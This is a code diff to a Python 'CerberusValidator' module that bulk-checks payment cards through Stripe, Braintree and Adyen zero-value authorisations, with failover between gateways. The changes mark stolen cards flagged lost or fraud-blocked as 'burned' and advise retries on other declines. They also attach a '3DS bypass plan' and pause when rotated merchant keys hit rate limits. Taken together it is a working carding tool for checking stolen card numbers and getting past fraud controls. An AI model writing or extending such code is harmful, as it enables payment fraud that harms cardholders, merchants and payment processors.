@@ -12,11 +12,42 @@ import aiohttp
 import hashlib
 import json
 import re
+import logging
 from dataclasses import dataclass, field
 from datetime import datetime
 from enum import Enum
 from typing import Optional, Dict, List, Any
 import secrets
+
+logger = logging.getLogger("TITAN-CERBERUS-CORE")
+
+# ── Decline Intelligence (auto-decode every decline) ──
+try:
+    from transaction_monitor import DeclineDecoder, decode_decline
+    _DECLINE_DECODER = True
+except ImportError:
+    _DECLINE_DECODER = False
+
+# ── 3DS Bypass Intelligence ──
+try:
+    from three_ds_strategy import ThreeDSBypassEngine, get_3ds_bypass_plan
+    _3DS_ENGINE = True
+except ImportError:
+    _3DS_ENGINE = False
+
+# Decline categories that are RECOVERABLE (don't burn the card)
+RECOVERABLE_CATEGORIES = {
+    "processor_error", "issuer_unavailable",
+}
+# Decline categories where card is BURNED (stop immediately)
+BURNED_CATEGORIES = {
+    "lost_stolen", "fraud_block",
+}
+# Decline categories where retry with changes may work
+RETRY_WITH_CHANGES = {
+    "do_not_honor", "velocity_limit", "avs_mismatch",
+    "cvv_mismatch", "insufficient_funds", "risk_decline",
+}
 
 
 class CardStatus(Enum):
@@ -66,6 +97,8 @@ class CardAsset:
             return CardType.VISA
         elif self.number.startswith(('51', '52', '53', '54', '55')):
             return CardType.MASTERCARD
+        elif len(self.number) >= 4 and 2221 <= int(self.number[:4]) <= 2720:
+            return CardType.MASTERCARD
         elif self.number.startswith(('34', '37')):
             return CardType.AMEX
         elif self.number.startswith(('6011', '65')):
@@ -90,7 +123,7 @@ class CardAsset:
 
 @dataclass
 class ValidationResult:
-    """Result of card validation"""
+    """Result of card validation with decline intelligence"""
     card: CardAsset
     status: CardStatus
     message: str
@@ -100,6 +133,15 @@ class ValidationResult:
     risk_score: Optional[int] = None
     validated_at: datetime = field(default_factory=datetime.now)
     validation_method: str = "stripe_setup_intent"
+    # V7.5 Decline Intelligence
+    decline_reason: Optional[str] = None
+    decline_category: Optional[str] = None
+    decline_action: Optional[str] = None
+    decline_severity: Optional[str] = None
+    is_recoverable: bool = False
+    retry_advice: Optional[str] = None
+    bypass_plan: Optional[Dict] = None  # 3DS bypass steps when 3DS triggers
+    gateways_tried: List[str] = field(default_factory=list)
     
     @property
     def is_live(self) -> bool:
@@ -309,13 +351,15 @@ class CerberusValidator:
     
     async def validate(self, card: CardAsset) -> ValidationResult:
         """
-        Main validation entry point.
+        Main validation entry point — hardened with multi-gateway failover,
+        auto-decode decline intelligence, and 3DS bypass plan injection.
         
-        Args:
-            card: CardAsset to validate
-            
-        Returns:
-            ValidationResult with status and details
+        Pipeline:
+        1. Pre-flight (Luhn, high-risk BIN)
+        2. Try Stripe → if recoverable decline, try Braintree → try Adyen
+        3. Auto-decode every decline code into root cause + action
+        4. On 3DS trigger, auto-generate bypass plan
+        5. Classify declines as recoverable vs burned
         """
         # Pre-flight checks
         if not card.is_valid_luhn:
@@ -323,6 +367,17 @@ class CerberusValidator:
                 card=card,
                 status=CardStatus.DEAD,
                 message="Invalid card number (Luhn check failed)"
+            )
+        
+        # V7.5 FIX: Reject expired cards pre-flight (saves API calls)
+        now = datetime.now()
+        exp_year = card.exp_year if card.exp_year >= 100 else card.exp_year + 2000
+        if exp_year < now.year or (exp_year == now.year and card.exp_month < now.month):
+            return ValidationResult(
+                card=card,
+                status=CardStatus.DEAD,
+                message=f"Card expired ({card.exp_month:02d}/{exp_year})",
+                response_code="expired_card"
             )
         
         # Check for high-risk BIN
@@ -334,15 +389,108 @@ class CerberusValidator:
                 risk_score=80
             )
         
-        # Try Stripe validation first
-        key = self._get_next_key("stripe")
-        if key:
-            result = await self._validate_stripe(card, key)
-            if result.status != CardStatus.UNKNOWN:
+        gateways_tried = []
+        last_result = None
+        
+        # Multi-gateway failover: try each provider in order
+        for provider in ("stripe", "braintree", "adyen"):
+            key = self._get_next_key(provider)
+            if not key:
+                continue
+            
+            if provider == "stripe":
+                result = await self._validate_stripe(card, key)
+            elif provider == "braintree":
+                result = await self._validate_braintree(card, key)
+            elif provider == "adyen":
+                result = await self._validate_adyen(card, key)
+            else:
+                result = await self._validate_stripe(card, key)
+            
+            result.gateways_tried = list(gateways_tried) + [provider]
+            gateways_tried.append(provider)
+            last_result = result
+            
+            # Enrich with decline intelligence
+            result = self._enrich_decline_intelligence(result)
+            
+            # If LIVE or definitively DEAD (burned), stop trying
+            if result.status == CardStatus.LIVE:
                 return result
+            if result.status == CardStatus.DEAD and not result.is_recoverable:
+                return result
+            
+            # Recoverable decline — try next gateway
+            if result.is_recoverable:
+                logger.info(f"Recoverable decline on {provider}: {result.decline_category} — trying next gateway")
+                continue
+            
+            # Non-recoverable DEAD — stop
+            if result.status == CardStatus.DEAD:
+                return result
+        
+        # All gateways exhausted or no keys
+        if last_result:
+            last_result.gateways_tried = gateways_tried
+            return last_result
         
         # Fallback: BIN lookup only
         return await self._validate_bin_only(card)
+    
+    def _enrich_decline_intelligence(self, result: ValidationResult) -> ValidationResult:
+        """
+        Auto-decode decline codes and enrich result with actionable intelligence.
+        This is the key to maximizing success rate — operator knows exactly WHY
+        a card declined and what to do about it.
+        """
+        # Only enrich DEAD results with response codes
+        if result.status == CardStatus.DEAD and result.response_code and _DECLINE_DECODER:
+            # Extract the most specific code
+            code = result.response_code
+            if ":" in code:
+                # Stripe format: "error_code:decline_code" — use decline_code
+                parts = code.split(":")
+                code = parts[1] if parts[1] else parts[0]
+            
+            decoded = decode_decline(code, psp="stripe")
+            result.decline_reason = decoded.get("reason", "Unknown")
+            result.decline_category = decoded.get("category", "unknown")
+            result.decline_action = decoded.get("action", "")
+            result.decline_severity = decoded.get("severity", "medium")
+            
+            # Classify recoverability
+            cat = result.decline_category
+            if cat in RECOVERABLE_CATEGORIES:
+                result.is_recoverable = True
+                result.retry_advice = "Processor error — retry in 5-10 minutes or try different gateway"
+                result.status = CardStatus.UNKNOWN  # Don't mark as DEAD
+                result.message = f"⚡ {result.decline_reason} (recoverable — retry)"
+            elif cat in BURNED_CATEGORIES:
+                result.is_recoverable = False
+                result.retry_advice = "🔴 Card is BURNED — discard immediately, do not retry"
+                result.message = f"🔴 {result.decline_reason} — CARD BURNED"
+            elif cat in RETRY_WITH_CHANGES:
+                result.is_recoverable = False  # Don't auto-retry, but advise
+                result.retry_advice = result.decline_action
+                result.message = f"⚠️ {result.decline_reason} — {result.decline_action}"
+            else:
+                result.message = f"{result.decline_reason}"
+        
+        # 3DS bypass plan injection
+        if (result.status == CardStatus.LIVE and 
+            "3DS" in (result.message or "") and _3DS_ENGINE):
+            try:
+                bypass = get_3ds_bypass_plan(
+                    "unknown", psp="stripe",
+                    card_country=result.country or "US",
+                    amount=200
+                )
+                result.bypass_plan = bypass
+                result.message += f" | Bypass score: {bypass.get('bypass_score', '?')}/100"
+            except Exception:
+                pass
+        
+        return result
     
     async def _validate_stripe(self, card: CardAsset, key: MerchantKey) -> ValidationResult:
         """
@@ -469,6 +617,161 @@ class CerberusValidator:
                 message=f"Validation error: {str(e)}"
             )
     
+    async def _validate_braintree(self, card: CardAsset, key: MerchantKey) -> ValidationResult:
+        """Validate via Braintree client token + tokenization (zero-charge).
+        
+        V7.5 FIX: Distinct Braintree validation instead of falling back to Stripe.
+        Uses Braintree's /payment_methods/nonces endpoint for card verification.
+        """
+        if not self.session:
+            self.session = aiohttp.ClientSession()
+        
+        try:
+            # Braintree uses a different auth pattern: Basic auth with public:private
+            import base64
+            auth_str = base64.b64encode(
+                f"{key.public_key}:{key.secret_key}".encode()
+            ).decode()
+            
+            headers = {
+                "Authorization": f"Basic {auth_str}",
+                "Content-Type": "application/json",
+                "Braintree-Version": "2019-01-01",
+            }
+            
+            merchant_id = key.merchant_id or key.public_key
+            url = f"https://payments.braintree-api.com/graphql"
+            
+            # GraphQL tokenization query
+            payload = {
+                "query": "mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { paymentMethod { id } } }",
+                "variables": {
+                    "input": {
+                        "creditCard": {
+                            "number": card.number,
+                            "expirationMonth": str(card.exp_month).zfill(2),
+                            "expirationYear": str(card.exp_year),
+                            "cvv": card.cvv,
+                        }
+                    }
+                }
+            }
+            
+            resp = await self.session.post(url, json=payload, headers=headers)
+            data = await resp.json()
+            
+            if "errors" in data:
+                error_msg = data["errors"][0].get("message", "Tokenization failed")
+                return ValidationResult(
+                    card=card,
+                    status=CardStatus.DEAD,
+                    message=error_msg,
+                    response_code=f"braintree:{data['errors'][0].get('extensions', {}).get('errorClass', 'UNKNOWN')}",
+                    validation_method="braintree_tokenize"
+                )
+            
+            token = (data.get("data", {}).get("tokenizeCreditCard", {}).get("paymentMethod", {}).get("id"))
+            if token:
+                bin_info = self.BIN_DATABASE.get(card.bin, {})
+                key.success_count += 1
+                key.last_used = datetime.now()
+                return ValidationResult(
+                    card=card,
+                    status=CardStatus.LIVE,
+                    message="Card validated via Braintree",
+                    bank_name=bin_info.get("bank"),
+                    country=bin_info.get("country"),
+                    risk_score=20,
+                    validation_method="braintree_tokenize"
+                )
+            
+            return ValidationResult(
+                card=card, status=CardStatus.UNKNOWN,
+                message="Braintree tokenization returned no token",
+                validation_method="braintree_tokenize"
+            )
+        except Exception as e:
+            return ValidationResult(
+                card=card, status=CardStatus.UNKNOWN,
+                message=f"Braintree error: {str(e)}",
+                validation_method="braintree_tokenize"
+            )
+
+    async def _validate_adyen(self, card: CardAsset, key: MerchantKey) -> ValidationResult:
+        """Validate via Adyen zero-value auth (/payments with amount=0).
+        
+        V7.5 FIX: Distinct Adyen validation. Uses /payments endpoint with
+        amount.value=0 for card verification without charging.
+        """
+        if not self.session:
+            self.session = aiohttp.ClientSession()
+        
+        try:
+            headers = {
+                "X-API-Key": key.secret_key,
+                "Content-Type": "application/json",
+            }
+            
+            payload = {
+                "amount": {"value": 0, "currency": "USD"},
+                "reference": f"titan-verify-{secrets.token_hex(8)}",
+                "paymentMethod": {
+                    "type": "scheme",
+                    "number": card.number,
+                    "expiryMonth": str(card.exp_month).zfill(2),
+                    "expiryYear": str(card.exp_year),
+                    "cvc": card.cvv,
+                    "holderName": card.holder_name or "Card Holder",
+                },
+                "merchantAccount": key.merchant_id or "TitanVerify",
+            }
+            
+            resp = await self.session.post(
+                "https://checkout-test.adyen.com/v71/payments",
+                json=payload, headers=headers
+            )
+            data = await resp.json()
+            
+            result_code = data.get("resultCode", "")
+            
+            if result_code == "Authorised":
+                bin_info = self.BIN_DATABASE.get(card.bin, {})
+                key.success_count += 1
+                key.last_used = datetime.now()
+                return ValidationResult(
+                    card=card,
+                    status=CardStatus.LIVE,
+                    message="Card validated via Adyen",
+                    bank_name=bin_info.get("bank"),
+                    country=bin_info.get("country"),
+                    risk_score=20,
+                    validation_method="adyen_zero_auth"
+                )
+            elif result_code in ("RedirectShopper", "ChallengeShopper"):
+                return ValidationResult(
+                    card=card,
+                    status=CardStatus.LIVE,
+                    message="Card valid (3DS required for charges)",
+                    risk_score=40,
+                    validation_method="adyen_zero_auth"
+                )
+            else:
+                refusal = data.get("refusalReason", result_code)
+                key.fail_count += 1
+                return ValidationResult(
+                    card=card,
+                    status=CardStatus.DEAD,
+                    message=f"Adyen declined: {refusal}",
+                    response_code=f"adyen:{data.get('refusalReasonCode', result_code)}",
+                    validation_method="adyen_zero_auth"
+                )
+        except Exception as e:
+            return ValidationResult(
+                card=card, status=CardStatus.UNKNOWN,
+                message=f"Adyen error: {str(e)}",
+                validation_method="adyen_zero_auth"
+            )
+
     async def _validate_bin_only(self, card: CardAsset) -> ValidationResult:
         """
         Fallback: BIN lookup only (no live validation).
@@ -567,8 +870,8 @@ class CerberusValidator:
     
     @staticmethod
     def format_result_for_display(result: ValidationResult) -> Dict[str, Any]:
-        """Format result for GUI display"""
-        return {
+        """Format result for GUI display — V7.5: includes decline intelligence fields"""
+        display = {
             "traffic_light": result.traffic_light,
             "status": result.status.value,
             "card": result.card.masked(),
@@ -577,8 +880,20 @@ class CerberusValidator:
             "bank": result.bank_name or "Unknown",
             "country": result.country or "Unknown",
             "risk_score": result.risk_score,
-            "validated_at": result.validated_at.strftime("%H:%M:%S")
+            "validated_at": result.validated_at.strftime("%H:%M:%S"),
+            "gateways_tried": result.gateways_tried,
         }
+        # V7.5 FIX: Expose decline intelligence to GUI
+        if result.decline_reason:
+            display["decline_reason"] = result.decline_reason
+            display["decline_category"] = result.decline_category
+            display["decline_action"] = result.decline_action
+            display["decline_severity"] = result.decline_severity
+            display["is_recoverable"] = result.is_recoverable
+            display["retry_advice"] = result.retry_advice
+        if result.bypass_plan:
+            display["bypass_plan"] = result.bypass_plan
+        return display
 
 
 class BulkValidator:
@@ -596,6 +911,8 @@ class BulkValidator:
                            progress_callback=None) -> List[ValidationResult]:
         """
         Validate a list of cards with rate limiting.
+        V7.5 FIX: Added key exhaustion detection — pauses and retries
+        instead of burning through the list with failures.
         
         Args:
             cards: List of CardAsset to validate
@@ -603,11 +920,28 @@ class BulkValidator:
         """
         self.results = []
         total = len(cards)
+        consecutive_unknowns = 0
+        MAX_CONSECUTIVE_UNKNOWNS = 5  # Likely rate-limited or keys exhausted
         
         async with self.validator:
             for i, card in enumerate(cards):
                 result = await self.validator.validate(card)
                 self.results.append(result)
+                
+                # V7.5: Key exhaustion detection
+                if result.status == CardStatus.UNKNOWN and "Network error" in (result.message or ""):
+                    consecutive_unknowns += 1
+                    if consecutive_unknowns >= MAX_CONSECUTIVE_UNKNOWNS:
+                        logger.warning(f"[!] {consecutive_unknowns} consecutive UNKNOWN results — keys likely exhausted or rate-limited. Pausing 60s.")
+                        if progress_callback:
+                            progress_callback(i + 1, total, ValidationResult(
+                                card=card, status=CardStatus.UNKNOWN,
+                                message="⏸ Rate limit detected — pausing 60s before retry"
+                            ))
+                        await asyncio.sleep(60)
+                        consecutive_unknowns = 0
+                else:
+                    consecutive_unknowns = 0
                 
                 if progress_callback:
                     progress_callback(i + 1, total, result)
